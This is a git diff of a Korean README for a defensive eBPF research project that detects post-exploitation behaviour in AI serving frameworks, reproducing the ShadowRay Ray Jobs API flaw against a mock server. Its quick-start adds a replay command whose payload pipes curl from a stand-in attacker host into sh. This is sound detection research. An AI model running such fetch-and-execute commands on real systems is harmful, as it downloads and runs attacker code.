@@ -18,6 +18,39 @@ AI 서빙 프레임워크(Ray, vLLM, Triton 등)에서 발견되는 원격 코�
 
 본 연구는 취약점 악용 이후의 악성 행위 탐지에 집중하며, 취약점 자체의 진단이나 초기 침투 벡터 차단, 그리고 다룬 CVE 외의 일반화된 방어는 범위 밖으로 한다.
 
+## 프로젝트 구조
+
+```
+kShield-VirtualPatch/
+├── paper_draft.md          논문 초안 (1~3장 완성, 4장 실험은 TODO)
+├── src/
+│   ├── kshield_vpatch.bpf.c  커널 공간 BPF 프로그램 (SHADOW_EXEC 탐지)
+│   ├── kshield_vpatch.c      사용자 공간 로더/로거
+│   └── Makefile
+└── attack/
+    ├── mock_ray_server.py    ShadowRay 취약점 재현용 목업 Jobs API
+    └── exploit_shadowray.py  공격 재현 스크립트
+```
+
+## 빠른 시작 (VM에서)
+
+```bash
+# 1) 목업 취약 서버 실행
+python3 attack/mock_ray_server.py
+
+# 2) (다른 터미널) kShield-VirtualPatch 빌드 및 실행 — 최초 vmlinux.h 생성 필요
+cd src
+bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h
+make
+sudo ./kshield_vpatch
+
+# 3) (다른 터미널) 공격 재현
+python3 attack/exploit_shadowray.py --cmd "curl http://attacker.example/payload.sh | sh"
+```
+
 ## 상태
 
-기획 단계. 관련 프로젝트: [kShield (원본, 모델 파일 보안)](https://github.com/sangheon-lee1028/Ai-ebpf)
+**기획 단계.** 코드와 논문 구조는 초안 수준이며, 실제 VM 컴파일·실행 테스트와
+실험 결과 수집이 필요하다. `paper_draft.md`의 `[TODO]` 표시 참고.
+
+관련 프로젝트: [kShield (원본, 모델 파일 보안)](https://github.com/sangheon-lee1028/Ai-ebpf)
